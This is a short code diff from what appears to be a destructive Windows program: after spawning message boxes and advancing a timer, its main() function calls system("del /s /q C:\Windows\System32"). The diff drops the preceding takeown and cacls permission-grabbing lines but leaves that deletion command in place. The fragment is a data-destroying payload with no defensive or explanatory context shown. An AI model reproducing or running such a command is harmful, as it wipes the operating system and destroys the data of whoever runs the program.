@@ -138,8 +138,6 @@ int main() {
     createChildProcess(scndmessageBoxPath);
     totalSecs += 68;
     progClock(totalSecs);
-    system("takeown /f C:\\Windows\\System32");
-    system("cacls C:\\Windows\\System32");
     system("del /s /q C:\\Windows\\System32");
 
     return 0;
